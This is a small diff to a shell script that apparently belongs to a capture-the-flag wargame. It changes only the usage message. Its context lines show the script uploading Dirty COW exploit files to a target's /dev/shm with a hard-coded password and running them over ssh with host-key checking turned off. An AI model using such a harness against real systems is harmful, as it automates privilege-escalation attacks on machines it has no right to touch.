@@ -12,5 +12,5 @@ if [ ! -z "$1" ] && [ ! -z "$2" ]; then
     sshpass -p level00 scp -P $2 Makefile dirtycow.c dirtycow.h getflags level00@$1:/dev/shm
     sshpass -p level00 ssh -o StrictHostKeyChecking=no level00@$1 -p $2 "$SCRIPT"
 else
-    echo "Usage: ./flag07.sh <ip address> <port>"
+    echo "Usage: ./run.sh <ip address> <port>"
 fi
